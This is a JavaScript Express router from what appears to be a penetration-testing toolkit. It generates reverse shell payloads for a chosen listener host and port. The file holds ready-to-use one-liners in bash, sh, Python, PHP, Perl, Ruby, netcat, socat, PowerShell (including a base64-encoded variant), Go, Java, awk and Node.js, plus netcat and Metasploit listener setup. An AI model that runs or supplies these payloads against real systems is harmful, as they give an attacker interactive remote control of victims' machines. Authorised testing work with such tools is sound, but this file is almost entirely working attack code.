import { Router } from 'express';
import express from 'express';
import { requireFields } from '../../../platform/server/middleware/validate.js';

const router = Router();

const IP_REGEX = /^(\d{1,3}\.){3}\d{1,3}$|^[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;
const PORT_REGEX = /^\d{1,5}$/;

const VALID_SHELL_TYPES = [
  'bash', 'bash-196', 'bash-readline', 'sh',
  'python', 'python3',
  'php', 'php-exec',
  'perl',
  'ruby',
  'netcat', 'netcat-e', 'ncat',
  'socat',
  'powershell', 'powershell-b64',
  'golang',
  'java',
  'awk',
  'nodejs',
];

function buildPayloads(shellType, lhost, lport) {
  const h = lhost;
  const p = lport;

  const map = {
    'bash': [
      `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
    ],
    'bash-196': [
      `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
    ],
    'bash-readline': [
      `exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    ],
    'sh': [
      `sh -i >& /dev/tcp/${h}/${p} 0>&1`,
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
    ],
    'python': [
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    ],
    'python3': [
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`,
    ],
    'php': [
      `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    ],
    'php-exec': [
      `php -r '$sock=fsockopen("${h}",${p});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
    ],
    'perl': [
      `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ],
    'ruby': [
      `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    ],
    'netcat': [
      `nc -e /bin/sh ${h} ${p}`,
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
    ],
    'netcat-e': [
      `nc.traditional -e /bin/bash ${h} ${p}`,
    ],
    'ncat': [
      `ncat ${h} ${p} -e /bin/bash`,
    ],
    'socat': [
      `socat TCP:${h}:${p} EXEC:/bin/sh`,
      `socat TCP:${h}:${p} EXEC:'bash -li',pty,stderr,setsid,sigint,sane`,
    ],
    'powershell': [
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(&([scriptblock]::Create($d)) 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
    ],
    'powershell-b64': [
      // Base64-encoded version generated server-side
      (() => {
        const cmd = `$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        const encoded = Buffer.from(cmd, 'utf16le').toString('base64');
        return `powershell -e ${encoded}`;
      })(),
    ],
    'golang': [
      `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${h}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
    ],
    'java': [
      `r = Runtime.getRuntime();p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do $line 2>&5 >&5; done"});p.waitFor();`,
    ],
    'awk': [
      `awk 'BEGIN {s = "/inet/tcp/0/${h}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
    ],
    'nodejs': [
      `node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${p},"${h}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})()'`,
    ],
  };

  return map[shellType] || [];
}

router.get('/shell-types', (req, res) => {
  res.json({
    shellTypes: VALID_SHELL_TYPES,
    listenerCommand: 'nc -lvnp <port>',
  });
});

router.post('/generate', express.json({ limit: '10kb' }), requireFields(['lhost', 'lport', 'shellType']), (req, res) => {
  const { lhost, lport, shellType } = req.body;

  if (!IP_REGEX.test(lhost)) {
    return res.status(400).json({ error: 'Invalid lhost. Must be a valid IP address or hostname.' });
  }
  if (!PORT_REGEX.test(lport) || parseInt(lport) < 1 || parseInt(lport) > 65535) {
    return res.status(400).json({ error: 'Invalid lport. Must be a number between 1 and 65535.' });
  }
  if (!VALID_SHELL_TYPES.includes(shellType)) {
    return res.status(400).json({ error: `Invalid shellType. Must be one of: ${VALID_SHELL_TYPES.join(', ')}` });
  }

  const payloads = buildPayloads(shellType, lhost, lport);

  res.json({
    shellType,
    lhost,
    lport,
    payloads,
    listenerCommand: `nc -lvnp ${lport}`,
    msfListener: [
      `use exploit/multi/handler`,
      `set PAYLOAD generic/shell_reverse_tcp`,
      `set LHOST ${lhost}`,
      `set LPORT ${lport}`,
      `run`,
    ],
  });
});

export default router;
